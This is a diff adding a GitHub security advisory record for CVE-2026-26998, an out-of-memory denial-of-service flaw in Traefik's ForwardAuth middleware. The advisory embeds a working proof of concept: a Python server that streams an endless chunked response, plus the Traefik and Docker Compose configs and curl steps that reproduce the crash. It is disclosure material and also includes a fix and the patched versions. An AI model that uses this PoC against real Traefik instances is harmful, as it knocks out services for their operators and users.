@@ -1,0 +1,78 @@
+{
+  "id": "GHSA-fw45-f5q2-2p4x",
+  "modified": "2026-03-04T18:31:15.626434Z",
+  "published": "2026-03-04T18:23:25Z",
+  "aliases": [
+    "CVE-2026-26998"
+  ],
+  "summary": "Traefik has unbounded io.ReadAll on auth server response body that causes OOM DOS",
+  "details": "## Impact\n\nThere is a potential vulnerability in Traefik managing the ForwardAuth middleware responses.\n\nWhen Traefik is configured to use the ForwardAuth middleware, the response body from the authentication server is read entirely into memory without any size limit. There is no `maxResponseBodySize` configuration to restrict the amount of data read from the authentication server response. If the authentication server returns an unexpectedly large or unbounded response body, Traefik will allocate unlimited memory, potentially causing an out-of-memory (OOM) condition that crashes the process.\n\nThis results in a denial of service for all routes served by the affected Traefik instance.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.38\n- https://github.com/traefik/traefik/releases/tag/v3.6.9\n\n## Workarounds\n\nNo workaround available.\n\n## For more information\n\nIf there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n---\n\n\u003cdetails\u003e\n\u003csummary\u003eOriginal Description\u003c/summary\u003e\n\n### Summary\n\nThe ForwardAuth middleware reads the entire authentication server response body into memory using io.ReadAll with no size limit. A single HTTP request through a ForwardAuth-protected route can cause the Traefik process to allocate gigabytes of memory and be killed by the OOM killer, resulting in complete denial of service for all routes on the affected entrypoint.\n\n### Details\n\nIn pkg/middlewares/auth/forward.go, line 213:\n\n    body, readError := io.ReadAll(forwardResponse.Body)\n\nWhen the ForwardAuth middleware receives a response from the configured authentication server, it calls io.ReadAll on the response body without any size constraint. If the auth server returns a large or infinite chunked response, Traefik will attempt to buffer the entire body in memory until the process is killed.\n\nTraefik already recognizes this class of risk for the request body direction. When forwardBody: true is configured without maxBodySize, a warning is logged (line 91-94):\n\n    logger.Warn().Msgf(\"ForwardAuth 'maxBodySize' is not configured with 'forwardBody: true', allowing unlimited request body size ...\")\n\nHowever, the response body path has no equivalent protection — no configuration option, no warning, and no default limit. The HTTP client has a 30-second timeout (line 102), but a streaming response can deliver hundreds of megabytes per second within that window.\n\n| Direction | Protection | Code |\n|-----------|-----------|------|\n| Request body to auth server | maxBodySize config + warning log | forward.go:85-95 |\n| Auth server response to Traefik | None | forward.go:213 |\n\n### PoC\n\n1. Create a malicious auth server (auth_infinite.py):\n\n    from http.server import BaseHTTPRequestHandler, HTTPServer\n\n    class InfiniteAuth(BaseHTTPRequestHandler):\n        def do_GET(self):\n            self.send_response(200)\n            self.send_header(\"Transfer-Encoding\", \"chunked\")\n            self.end_headers()\n            chunk = b\"A\" * (64 * 1024)\n            try:\n                while True:\n                    self.wfile.write(f\"{len(chunk):x}\\r\\n\".encode())\n                    self.wfile.write(chunk + b\"\\r\\n\")\n                    self.wfile.flush()\n            except BrokenPipeError:\n                pass\n\n    HTTPServer((\"0.0.0.0\", 9000), InfiniteAuth).serve_forever()\n\n2. Traefik dynamic config (dynamic.yml):\n\n    http:\n      routers:\n        protected:\n          entryPoints: [web]\n          rule: \"PathPrefix('/admin')\"\n          middlewares: [auth]\n          service: whoami\n      middlewares:\n        auth:\n          forwardAuth:\n            address: \"http://auth:9000/auth\"\n      services:\n        whoami:\n          loadBalancer:\n            servers:\n              - url: \"http://whoami:80\"\n\n3. Docker Compose (docker-compose.yml):\n\n    services:\n      traefik:\n        image: traefik:v3.6\n        command:\n          - --entrypoints.web.address=:8000\n          - --providers.file.filename=/etc/traefik/dynamic.yml\n        ports:\n          - \"8000:8000\"\n        volumes:\n          - ./dynamic.yml:/etc/traefik/dynamic.yml:ro\n        deploy:\n          resources:\n            limits:\n              memory: 512M\n        depends_on: [auth, whoami]\n      auth:\n        image: python:3.12-slim\n        command: [\"python\", \"/app/auth_infinite.py\"]\n        volumes:\n          - ./auth_infinite.py:/app/auth_infinite.py:ro\n      whoami:\n        image: traefik/whoami:v1.11\n\n4. Reproduce:\n\n    docker compose up -d\n    docker stats --no-stream traefik  # ~14 MiB\n    curl -s -o /dev/null http://localhost:8000/admin\n    docker inspect traefik --format '{{.State.OOMKilled}}'  # true\n    docker inspect traefik --format '{{.State.ExitCode}}'    # 137 (SIGKILL)\n\nObserved results:\n\n| Scenario | Memory |\n|----------|--------|\n| Idle baseline (20 seconds) | 14.8 MiB to 14.8 MiB (no change) |\n| 10 normal requests (4-byte auth response) | 14.8 MiB to 15.8 MiB (+1 MiB) |\n| 1 malicious request (no memory limit) | 98 MiB to 1.43 GiB (14.6x amplification) |\n| 1 malicious request (512MB memory limit) | 14 MiB to OOM kill in less than 3 seconds |\n\nAfter OOM kill, all routes on the entrypoint become unreachable — complete service outage.\n\n### Impact\n\nThis is a denial-of-service vulnerability. Any Traefik instance using the ForwardAuth middleware is affected. A single HTTP request can crash the Traefik process, causing a full outage for all services behind the affected entrypoint.\n\nRealistic attack scenarios include:\n\n- Multi-tenant platforms where tenants configure their own ForwardAuth endpoints (SaaS, PaaS, Kubernetes ingress controllers)\n- Compromised or buggy auth servers that return unexpected large responses\n- Defense in depth: even trusted auth servers should not be able to crash the proxy\n\n### Suggested Fix\n\nApply io.LimitReader to the auth response body, mirroring the existing maxBodySize pattern for request bodies:\n\n    const defaultMaxAuthResponseSize int64 = 1 \u003c\u003c 20 // 1 MiB\n    limitedBody := io.LimitReader(forwardResponse.Body, defaultMaxAuthResponseSize)\n    body, readError := io.ReadAll(limitedBody)\n\nOptionally expose a maxResponseBodySize configuration option for operators who need larger auth response bodies.\n\n\u003c/details\u003e",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v2",
+        "purl": "pkg:golang/github.com/traefik/traefik/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.38"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.11.37",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-fw45-f5q2-2p4x/GHSA-fw45-f5q2-2p4x.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.6.9"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.6.8",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-fw45-f5q2-2p4x/GHSA-fw45-f5q2-2p4x.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-fw45-f5q2-2p4x"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/traefik/traefik"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v2.11.38"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.6.9"
+    }
+  ]
+}
